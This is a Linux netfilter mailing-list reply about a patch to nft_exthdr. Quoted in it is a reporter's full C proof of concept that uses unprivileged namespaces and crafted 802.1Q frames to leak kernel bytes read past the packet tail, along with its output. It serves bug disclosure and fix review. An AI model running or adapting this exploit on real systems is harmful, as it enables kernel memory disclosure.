Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=217.70.190.124
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795659846;
	b=P+h0pMxQrAPZYv2uNhOj6RiL6rLnWWlq8hmv+U//luPrvBj6BynVbEDTd5k6KxCV0MJQ
	 3L4i1eMeYwHWwpwZHHmr7IMjDiCQY1Cicz56WBYWZBbFvAhBBmUrJUmqoUYjLEjl64hri
	 cCEZUEEZdaJqxjEvt/DdIsJ46Q6kKhKxC+MbeGSZY4Xuu6GxcvA+Kxqfknried6xnYRcX
	 N3HG5VQSRn6tNFlHgq7No8qWWySkshDVXqbnQx2NNWov1lsMZK6FDUVg0JcbdFEnE6lS5
	 jwP7Rwx15/xxQ8G99WG7Tu0zSOodPtvZL1jtRgYoz+gsR3XBAo0ZNmfiMOUhF9uGxxg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795659846;
	h=DMARC-Filter:DKIM-Signature:Received:Date:From:To:Cc:Subject:
	 Message-ID:References:MIME-Version:Content-Type:Content-Disposition:
	 Content-Transfer-Encoding:In-Reply-To:X-Spam-Status:
	 X-Spam-Checker-Version;
	bh=VAP3d6M0GBB9mvkSicxCQEE++z7Ng2hIq9HJyi0wOzM=;
	b=dcG+IcG78AMu8FAyAvPcn+hHKosZ8+s21urk7Zk3pgcXuYizZyyIzJAJRb3lf2HKaeFM
	 GWkLbiib0FgGpmYMha/sDHaf12NJodik3tJge3k6xVA2P+2exlibb2ty60aMG70CrteVI
	 73/uoQXkc5FoAswl3/RdEBQOQdaMA1CsWp9nwgT+uEH9pQT1klson8vp7zf/Jj/p4ZCn9
	 srm0C497Pi84J9jK/belGSj2vPV925u9sP3OKp4aXTqQpLmpxTMkQeudTgLBDL7ZdnARN
	 fg38rc4nGVOIgMB8yT0aC0mOMAArtKPLWLc7+3ELIwcgkpCF0lSJSIollImcWZlZyXw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=none header.from=netfilter.org;
	spf=pass smtp.mailfrom=netfilter.org;
	dkim=pass header.d=netfilter.org header.i=@netfilter.org header.a=rsa-sha256 header.s=2025 header.b=Vxr6cKgS;
	arc=none smtp.remote-ip=217.70.190.124
Received: from mail.netfilter.org (mail.netfilter.org [217.70.190.124])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with UTF8SMTPS id 617BB606A31E;
	Thu, 26 Nov 2026 02:24:05 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 617BB606A31E
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=netfilter.org
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=netfilter.org
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=netfilter.org header.i=@netfilter.org header.a=rsa-sha256 header.s=2025 header.b=Vxr6cKgS
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=netfilter.org;
	s=2025; t=1795659842;
	bh=VAP3d6M0GBB9mvkSicxCQEE++z7Ng2hIq9HJyi0wOzM=;
	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
	b=Vxr6cKgSbqakay+wdba0Mi6RZ8k2XXJ2UujZsvPJ4ALDQ1I1G9RC+RV+4r5tbFdd0
	 BcTcScuuVMNars5T0sn/Sug54ap2NqXRKGu0wDXUWOTtyfW/m/0oq40oG6WcbQEzth
	 r7nWWCs0FZ1/6o6a1qiVrlmJtrsfjvzWJ5Im4XV45LZcU+orh0/wU8N4HpJRNRBPXU
	 8B1w6DDgTeSIBPPIj9IVLfBwQRHDFuubSMe6o43JWgGdoazG4yHIf5NBl+kDIZRSXn
	 9q19FUFL92oA2x/E2yTl/1qSdnNfzR+PTRNDpuKLDLFZVbAc/Op5QuTsb+UBklS92H
	 7BYwx/gkTq0vg==
Received: from netfilter.org (mail-agni [217.70.190.124])
	by mail.netfilter.org (Postfix) with UTF8SMTPSA id 61C2A6007B;
	Thu, 26 Nov 2026 03:24:02 +0100 (CET)
Date: Thu, 26 Nov 2026 03:23:59 +0100
From: Pablo Neira Ayuso <pablo@netfilter.org>
To: Xiang Mei <xmei5@asu.edu>
Cc: Florian Westphal <fw@strlen.de>, Phil Sutter <phil@nwl.cc>,
	"David S. Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@kernel.org>,
	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>,
	Willem de Bruijn <willemb@google.com>,
	Simon Horman <horms@kernel.org>, netfilter-devel@vger.kernel.org,
	coreteam@netfilter.org, netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org, stable@vger.kernel.org,
	co+85229ab197510ca7@bugs.sh
Subject: Re: [PATCH nf] netfilter: nft_exthdr: pull the IPv6 header before
 ipv6_find_hdr()
Message-ID: <aweYPz6oQlIYXddC@chamomile>
References: <20261126001151.13793-1-xmei5@asu.edu>
 <awd9f47inahmDWRP@chamomile>
 <awd_r2mOR7xuYzh4@chamomile>
 <CAPpSM+TTd7sQvAjDS_u69xLNwtPgFrr23dxi8yKgRPfqosfjUQ@mail.gmail.com>
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Post: <mailto:netfilter-devel@vger.kernel.org>
List-Help: <mailto:netfilter-devel+help@vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netfilter-devel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <CAPpSM+TTd7sQvAjDS_u69xLNwtPgFrr23dxi8yKgRPfqosfjUQ@mail.gmail.com>

On Wed, Nov 25, 2026 at 06:43:35PM -0700, Xiang Mei wrote:
> On Wed, Nov 25, 2026 at 5:39 PM Pablo Neira Ayuso <pablo@netfilter.org> wrote:
> >
> > On Thu, Nov 26, 2026 at 01:29:55AM +0100, Pablo Neira Ayuso wrote:
> > > On Wed, Nov 25, 2026 at 05:11:51PM -0700, Xiang Mei wrote:
> > [...]
> > > > Pull the header before the call, as act_ct, virtio_net_hdr_to_skb() and
> > > > nft_set_pktinfo_ipv6_ingress() already do.
> >
> > I prefer this patch (see attachment).
> >
> > Please, don't take, I will submit it myself including your
> > Reported-by: tag.
> >
> > Thanks.
> 
> Sorry, I replied only to Pablo earlier. A resend of my test:
> 
> Thanks for the patch. I have just tested it agaist the PoC (attached to
> this mail) but it still leaks.
> 
> The 18-byte 802.1Q frame still makes ipv6_find_hdr() read past the
> tail, same as the unpatched kernel. The pull in validate fails, we
> fall back to nft_set_pktinfo_unspec(), and nft_do_chain_netdev() still
> runs the chain, so exthdr gets called with only the skb->protocol
> check.

I think nft_pktinfo provides enough information to skip this skbuff in
nft_exthdr, there is pkt->ethertype which can be used for this
purpose, which should be zero in this case.

diff --git a/net/netfilter/nft_exthdr.c b/net/netfilter/nft_exthdr.c
index 861bab93f435..448b9ecde1f0 100644
--- a/net/netfilter/nft_exthdr.c
+++ b/net/netfilter/nft_exthdr.c
@@ -52,7 +52,7 @@ static void nft_exthdr_ipv6_eval(const struct nft_expr *expr,
        unsigned int offset = 0;
        int err;
 
-       if (pkt->skb->protocol != htons(ETH_P_IPV6))
+       if (pkt->ethertype != htons(ETH_P_IPV6))
                goto err;
 
        err = ipv6_find_hdr(pkt->skb, &offset, priv->type, NULL, NULL);
@@ -146,7 +146,7 @@ static void nft_exthdr_ipv4_eval(const struct nft_expr *expr,
        unsigned int offset;
        int err;
 
-       if (skb->protocol != htons(ETH_P_IP))
+       if (pkt->ethertype != htons(ETH_P_IP))
                goto err;
 
        err = ipv4_find_option(nft_net(pkt), skb, &offset, priv->type);

> I think exthdr still needs its own check, or the netdev/bridge chains
> should not evaluate rules against an skb that failed validation. Your
> change still looks useful on top of that for the frags case.

I don't think so, if there is a chance to skip re-evaluation, the better.

> One more thing: nft_meta.c calls __nft_set_pktinfo_ipv6_validate()
> with a non-zero nhoff for VLAN/PPPoE, but the new code pulls and reads
> the header at offset 0, so it checks the outer header there.
> 
> Thanks,
> Xiang
> 
> The PoC:
> ```c
> #include <errno.h>
> #include <fcntl.h>
> #include <sched.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <grp.h>
> #include <sys/prctl.h>
> #include <net/if.h>
> #include <arpa/inet.h>
> #include <sys/ioctl.h>
> #include <sys/socket.h>
> #include <sys/time.h>
> #include <linux/netlink.h>
> #include <linux/rtnetlink.h>
> #include <linux/if_packet.h>
> #include <linux/if_ether.h>
> 
> #define NFNL_SUBSYS_NFTABLES    10
> #define NFNL_MSG_BATCH_BEGIN    16
> #define NFNL_MSG_BATCH_END      17
> #define NFT_MSG_NEWTABLE        0
> #define NFT_MSG_NEWCHAIN        3
> #define NFT_MSG_NEWRULE         6
> #define NFT_MSG_GETRULE         7
> #define NFTA_TABLE_NAME         1
> #define NFTA_CHAIN_TABLE        1
> #define NFTA_CHAIN_NAME         3
> #define NFTA_CHAIN_HOOK         4
> #define NFTA_CHAIN_TYPE         7
> #define NFTA_HOOK_HOOKNUM       1
> #define NFTA_HOOK_PRIORITY      2
> #define NFTA_HOOK_DEV           3
> #define NFTA_RULE_TABLE         1
> #define NFTA_RULE_CHAIN         2
> #define NFTA_RULE_EXPRESSIONS   4
> #define NFTA_RULE_USERDATA      7
> #define NFTA_LIST_ELEM          1
> #define NFTA_EXPR_NAME          1
> #define NFTA_EXPR_DATA          2
> #define NFTA_EXTHDR_DREG        1
> #define NFTA_EXTHDR_TYPE        2
> #define NFTA_EXTHDR_OFFSET      3
> #define NFTA_EXTHDR_LEN         4
> #define NFTA_EXTHDR_FLAGS       5
> #define NFT_EXTHDR_F_PRESENT    1
> #define NFTA_CMP_SREG           1
> #define NFTA_CMP_OP             2
> #define NFTA_CMP_DATA           3
> #define NFTA_DATA_VALUE         1
> #define NFTA_COUNTER_PACKETS    2
> #define NFPROTO_NETDEV          5
> #define NFT_REG_1               1
> #ifndef NETLINK_NETFILTER
> #define NETLINK_NETFILTER       12
> #endif
> 
> #define ROUNDS          64
> 
> struct nfgen { uint8_t family, version; uint16_t res_id; };
> 
> static int nl, pfd, ifi;
> static uint32_t seq = 1;
> static uint64_t cnt[256];
> 
> static void die(const char *m) { fprintf(stderr, "[-] %s: %s\n", m,
> strerror(errno)); exit(1); }
> 
> static char *put(char *p, int type, const void *d, int len)
> {
>         struct nlattr *a = (struct nlattr *)p;
> 
>         a->nla_type = type;
>         a->nla_len = NLA_HDRLEN + len;
>         memcpy(p + NLA_HDRLEN, d, len);
>         memset(p + NLA_HDRLEN + len, 0, NLA_ALIGN(len) - len);
>         return p + NLA_ALIGN(a->nla_len);
> }
> static char *put_str(char *p, int t, const char *s) { return put(p, t,
> s, strlen(s) + 1); }
> static char *put_be32(char *p, int t, uint32_t v) { v = htonl(v);
> return put(p, t, &v, 4); }
> static char *nest(char **p, int type)
> {
>         struct nlattr *a = (struct nlattr *)*p;
> 
>         a->nla_type = type | NLA_F_NESTED;
>         *p += NLA_HDRLEN;
>         return (char *)a;
> }
> static void nest_end(char *a, char *p) { ((struct nlattr *)a)->nla_len
> = p - a; }
> 
> /* ---------------------------------------------------------------- setup */
> 
> static void write_file(const char *path, const char *s)
> {
>         int fd = open(path, O_WRONLY);
> 
>         if (fd < 0 || write(fd, s, strlen(s)) < 0)
>                 die(path);
>         close(fd);
> }
> 
> static void enter_ns(void)
> {
>         char map[32];
>         uid_t uid = getuid();
>         gid_t gid = getgid();
> 
>         if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
>                 die("unshare");
>         write_file("/proc/self/setgroups", "deny");
>         snprintf(map, sizeof(map), "0 %d 1", uid);
>         write_file("/proc/self/uid_map", map);
>         snprintf(map, sizeof(map), "0 %d 1", gid);
>         write_file("/proc/self/gid_map", map);
> }
> 
> static void rtnl_veth(void)
> {
>         char buf[512] = {}, *p, *li, *id, *peer;
>         struct nlmsghdr *h = (struct nlmsghdr *)buf;
>         int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
> 
>         h->nlmsg_type = RTM_NEWLINK;
>         h->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
>         p = (char *)NLMSG_DATA(h) + NLMSG_ALIGN(sizeof(struct ifinfomsg));
>         p = put_str(p, IFLA_IFNAME, "vp0");
>         li = nest(&p, IFLA_LINKINFO);
>         p = put(p, IFLA_INFO_KIND, "veth", 4);
>         id = nest(&p, IFLA_INFO_DATA);
>         peer = nest(&p, 1 /* VETH_INFO_PEER */);
>         p += sizeof(struct ifinfomsg);
>         p = put_str(p, IFLA_IFNAME, "vp1");
>         nest_end(peer, p);
>         nest_end(id, p);
>         nest_end(li, p);
>         h->nlmsg_len = p - buf;
>         if (fd < 0 || send(fd, buf, h->nlmsg_len, 0) < 0)
>                 die("RTM_NEWLINK");
>         close(fd);
> }
> 
> static void link_up(const char *name)
> {
>         struct ifreq ifr = {};
>         int fd = socket(AF_INET, SOCK_DGRAM, 0);
> 
>         strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
>         if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
>                 die("SIOCGIFFLAGS");
>         ifr.ifr_flags |= IFF_UP;
>         if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
>                 die("SIOCSIFFLAGS");
>         close(fd);
> }
> 
> /* ------------------------------------------------------------- nftables */
> 
> static char *msg(char *cur, int type, int flags)
> {
>         struct nlmsghdr *h = (struct nlmsghdr *)cur;
>         struct nfgen *g = (struct nfgen *)NLMSG_DATA(h);
> 
>         memset(h, 0, NLMSG_HDRLEN + sizeof(*g));
>         h->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | type;
>         h->nlmsg_flags = NLM_F_REQUEST | flags;
>         h->nlmsg_seq = ++seq;
>         g->family = NFPROTO_NETDEV;
>         return cur + NLMSG_HDRLEN + sizeof(*g);
> }
> static char *msg_end(char *cur, char *p) { ((struct nlmsghdr
> *)cur)->nlmsg_len = p - cur; return p; }
> static char *batch(char *cur, int type)
> {
>         struct nlmsghdr *h = (struct nlmsghdr *)cur;
>         struct nfgen *g = (struct nfgen *)NLMSG_DATA(h);
> 
>         memset(h, 0, NLMSG_HDRLEN + sizeof(*g));
>         h->nlmsg_type = type;
>         h->nlmsg_flags = NLM_F_REQUEST;
>         h->nlmsg_seq = ++seq;
>         h->nlmsg_len = NLMSG_HDRLEN + sizeof(*g);
>         g->res_id = htons(NFNL_SUBSYS_NFTABLES);
>         return cur + h->nlmsg_len;
> }
> 
> static void nft_commit(char *buf, char *end)
> {
>         char rb[8192];
>         int n;
> 
>         if (send(nl, buf, end - buf, 0) < 0)
>                 die("nft send");
>         while ((n = recv(nl, rb, sizeof(rb), MSG_DONTWAIT)) > 0) {
>                 struct nlmsghdr *r = (struct nlmsghdr *)rb;
> 
>                 for (; NLMSG_OK(r, n); r = NLMSG_NEXT(r, n)) {
>                         struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(r);
> 
>                         if (r->nlmsg_type == NLMSG_ERROR && e->error) {
>                                 errno = -e->error;
>                                 die("nft batch");
>                         }
>                 }
>         }
> }
> 
> static char *rule(char *cur, int t)
> {
>         uint8_t ud = t, one = 1;
>         char *p, *ex, *e, *d, *v;
> 
>         p = msg(cur, NFT_MSG_NEWRULE, NLM_F_CREATE | NLM_F_APPEND | NLM_F_ACK);
>         p = put_str(p, NFTA_RULE_TABLE, "t");
>         p = put_str(p, NFTA_RULE_CHAIN, "c");
>         p = put(p, NFTA_RULE_USERDATA, &ud, 1);
>         ex = nest(&p, NFTA_RULE_EXPRESSIONS);
> 
>         e = nest(&p, NFTA_LIST_ELEM);                   /* exthdr ipv6
> type t exists */
>         p = put_str(p, NFTA_EXPR_NAME, "exthdr");
>         d = nest(&p, NFTA_EXPR_DATA);
>         p = put_be32(p, NFTA_EXTHDR_DREG, NFT_REG_1);
>         p = put(p, NFTA_EXTHDR_TYPE, &ud, 1);
>         p = put_be32(p, NFTA_EXTHDR_OFFSET, 0);
>         p = put_be32(p, NFTA_EXTHDR_LEN, 1);
>         p = put_be32(p, NFTA_EXTHDR_FLAGS, NFT_EXTHDR_F_PRESENT);
>         nest_end(d, p);
>         nest_end(e, p);
> 
>         e = nest(&p, NFTA_LIST_ELEM);                   /* cmp reg1 == 1 */
>         p = put_str(p, NFTA_EXPR_NAME, "cmp");
>         d = nest(&p, NFTA_EXPR_DATA);
>         p = put_be32(p, NFTA_CMP_SREG, NFT_REG_1);
>         p = put_be32(p, NFTA_CMP_OP, 0 /* NFT_CMP_EQ */);
>         v = nest(&p, NFTA_CMP_DATA);
>         p = put(p, NFTA_DATA_VALUE, &one, 1);
>         nest_end(v, p);
>         nest_end(d, p);
>         nest_end(e, p);
> 
>         e = nest(&p, NFTA_LIST_ELEM);                   /* counter */
>         p = put_str(p, NFTA_EXPR_NAME, "counter");
>         nest_end(e, p);
> 
>         nest_end(ex, p);
>         return msg_end(cur, p);
> }
> 
> static void nft_setup(void)
> {
>         static char buf[65536];
>         char *cur, *p, *hk;
>         int t = 0, i;
> 
>         nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
>         if (nl < 0)
>                 die("NETLINK_NETFILTER");
> 
>         cur = batch(buf, NFNL_MSG_BATCH_BEGIN);
>         p = msg(cur, NFT_MSG_NEWTABLE, NLM_F_CREATE | NLM_F_ACK);
>         p = put_str(p, NFTA_TABLE_NAME, "t");
>         cur = msg_end(cur, p);
>         p = msg(cur, NFT_MSG_NEWCHAIN, NLM_F_CREATE | NLM_F_ACK);
>         p = put_str(p, NFTA_CHAIN_TABLE, "t");
>         p = put_str(p, NFTA_CHAIN_NAME, "c");
>         p = put_str(p, NFTA_CHAIN_TYPE, "filter");
>         hk = nest(&p, NFTA_CHAIN_HOOK);
>         p = put_be32(p, NFTA_HOOK_HOOKNUM, 0 /* NF_NETDEV_INGRESS */);
>         p = put_be32(p, NFTA_HOOK_PRIORITY, 0);
>         p = put_str(p, NFTA_HOOK_DEV, "vp1");
>         nest_end(hk, p);
>         cur = msg_end(cur, p);
>         cur = batch(cur, NFNL_MSG_BATCH_END);
>         nft_commit(buf, cur);
> 
>         while (t < 256) {
>                 cur = batch(buf, NFNL_MSG_BATCH_BEGIN);
>                 for (i = 0; i < 32 && t < 256; i++)
>                         cur = rule(cur, t++);
>                 cur = batch(cur, NFNL_MSG_BATCH_END);
>                 nft_commit(buf, cur);
>         }
> }
> 
> /* nf_tables dumps nests without NLA_F_NESTED, so walk the levels by hand */
> #define for_each_nla(x, a, len, rem)
>          \
>         for (x = (struct nlattr *)(a), rem = (len);
>          \
>             rem >= NLA_HDRLEN && x->nla_len >= NLA_HDRLEN &&
> x->nla_len <= rem; \
>             rem -= NLA_ALIGN(x->nla_len),
>          \
>             x = (struct nlattr *)((char *)x + NLA_ALIGN(x->nla_len)))
> #define NLA_DATA(x)     ((char *)(x) + NLA_HDRLEN)
> #define NLA_LEN(x)      ((x)->nla_len - NLA_HDRLEN)
> 
> /* rule -> userdata (T) and expressions/elem/data/COUNTER_PACKETS */
> static void parse_rule(char *a, int len)
> {
>         struct nlattr *r, *el, *ex, *c;
>         int r1, r2, r3, r4, t = -1;
>         uint64_t pk = 0;
> 
>         for_each_nla(r, a, len, r1) {
>                 if (r->nla_type == NFTA_RULE_USERDATA)
>                         t = (uint8_t)NLA_DATA(r)[0];
>                 if (r->nla_type != NFTA_RULE_EXPRESSIONS)
>                         continue;
>                 for_each_nla(el, NLA_DATA(r), NLA_LEN(r), r2) {
>                         bool counter = false;
> 
>                         for_each_nla(ex, NLA_DATA(el), NLA_LEN(el), r3) {
>                                 if (ex->nla_type == NFTA_EXPR_NAME)
>                                         counter =
> !strcmp(NLA_DATA(ex), "counter");
>                                 else if (ex->nla_type ==
> NFTA_EXPR_DATA && counter)
>                                         for_each_nla(c, NLA_DATA(ex),
> NLA_LEN(ex), r4)
>                                                 if (c->nla_type ==
> NFTA_COUNTER_PACKETS)
>                                                         pk =
> be64toh(*(uint64_t *)NLA_DATA(c));
>                         }
>                 }
>         }
>         if (t >= 0)
>                 cnt[t] = pk;
> }
> 
> static void read_counters(void)
> {
>         static char rb[1 << 18];
>         char buf[256], *p = msg(buf, NFT_MSG_GETRULE, NLM_F_DUMP);
>         int n;
> 
>         p = put_str(p, NFTA_RULE_TABLE, "t");
>         msg_end(buf, p);
>         if (send(nl, buf, ((struct nlmsghdr *)buf)->nlmsg_len, 0) < 0)
>                 die("GETRULE");
>         while ((n = recv(nl, rb, sizeof(rb), 0)) > 0) {
>                 struct nlmsghdr *r = (struct nlmsghdr *)rb;
> 
>                 for (; NLMSG_OK(r, n); r = NLMSG_NEXT(r, n)) {
>                         char *a = (char *)NLMSG_DATA(r) + sizeof(struct nfgen);
> 
>                         if (r->nlmsg_type == NLMSG_DONE ||
> r->nlmsg_type == NLMSG_ERROR)
>                                 return;
>                         parse_rule(a, (char *)r + r->nlmsg_len - a);
>                 }
>         }
> }
> 
> /* --------------------------------------------------------------- probes */
> 
> static void tx(const unsigned char *f, int len, uint16_t proto)
> {
>         struct sockaddr_ll sll = {};
> 
>         sll.sll_family = AF_PACKET;
>         sll.sll_ifindex = ifi;
>         sll.sll_protocol = htons(proto);
>         sll.sll_halen = ETH_ALEN;
>         if (sendto(pfd, f, len, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
>                 die("sendto");
> }
> 
> int main(void)
> {
>         unsigned char probe[18] = {
>                 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x02, 0x02, 0x02,
> 0x02, 0x02, 0x02,
>                 0x81, 0x00,             /* ETH_P_8021Q */
>                 0x00, 0x64,             /* vid 100 */
>                 0x86, 0xdd,             /* inner: ETH_P_IPV6, then nothing */
>         };
>         uint64_t before[256];
>         cpu_set_t cs;
>         int r, t, hit = 0;
> 
>         setvbuf(stdout, NULL, _IONBF, 0);
>         CPU_ZERO(&cs);
>         CPU_SET(0, &cs);
>         sched_setaffinity(0, sizeof(cs), &cs);
> 
>         if (getuid() == 0) {                    /* drop to an
> unprivileged user */
>                 setgroups(0, NULL);
>                 if (setresgid(1000, 1000, 1000) || setresuid(1000, 1000, 1000))
>                         die("drop privileges");
>                 prctl(PR_SET_DUMPABLE, 1);      /* lets us write our
> own uid_map */
>         }
>         printf("[*] uid=%d\n", getuid());
>         enter_ns();
>         /* keep IPv6 autoconf traffic off the veths */
>         write_file("/proc/sys/net/ipv6/conf/all/disable_ipv6", "1");
>         write_file("/proc/sys/net/ipv6/conf/default/disable_ipv6", "1");
>         rtnl_veth();
>         link_up("vp0");
>         link_up("vp1");
>         nft_setup();
> 
>         pfd = socket(AF_PACKET, SOCK_RAW, 0);
>         ifi = if_nametoindex("vp0");
>         if (pfd < 0 || !ifi)
>                 die("AF_PACKET");
> 
> 
>         printf("[*] sending %d 18-byte 802.1Q probes with no IPv6
> header\n", ROUNDS);
>         read_counters();
>         memcpy(before, cnt, sizeof(before));
>         for (r = 0; r < ROUNDS; r++) {
>                 tx(probe, sizeof(probe), ETH_P_8021Q);
>                 usleep(20000);
>         }
>         read_counters();
>         for (t = 0; t < 256; t++) {
>                 if (cnt[t] == before[t])
>                         continue;
>                 printf("    rule 0x%02x fired %llu/%d: kernel read
> byte 0x%02x past skb tail\n",
>                       t, (unsigned long long)(cnt[t] - before[t]), ROUNDS, t);
>                 hit += cnt[t] - before[t];
>         }
>         printf("[%c] %d/%d probes leaked a byte from past the end of
> the packet\n",
>               hit ? '+' : '-', hit, ROUNDS);
>         return !hit;
> }
> ```
> 
> My run output of your attached patch:
> ```log
> [*] sending 64 18-byte 802.1Q probes with no IPv6 header
>     rule 0x01 fired 25/64: kernel read byte 0x01 past skb tail
>     rule 0x02 fired 2/64: kernel read byte 0x02 past skb tail
>     rule 0x03 fired 1/64: kernel read byte 0x03 past skb tail
>     rule 0x74 fired 1/64: kernel read byte 0x74 past skb tail
> ...
> ```
> 
> I also confirmed the same result after inserting some debug to the kernel.
> 
> ```log
> [    4.041624] DBG_OOB head=ffff888021df96c0 nh=20 tail=20 end=384
> byte=0x00 ptr16_23(head+544)=0xdf
> [    4.061809] DBG_OOB head=ffff888021df9a00 nh=20 tail=20 end=384
> byte=0x00 ptr16_23(head+544)=0xdf
> [    4.081970] DBG_OOB head=ffff888021df63c0 nh=20 tail=20 end=384
> byte=0x00 ptr16_23(head+544)=0xdf
> [    4.102192] DBG_OOB head=ffff888021df6080 nh=20 tail=20 end=384
> byte=0x00 ptr16_23(head+544)=0xdf
> [    4.122357] DBG_OOB head=ffff888021de5a00 nh=20 tail=20 end=384
> byte=0x01 ptr16_23(head+544)=0xde
> ...
> ```
> 
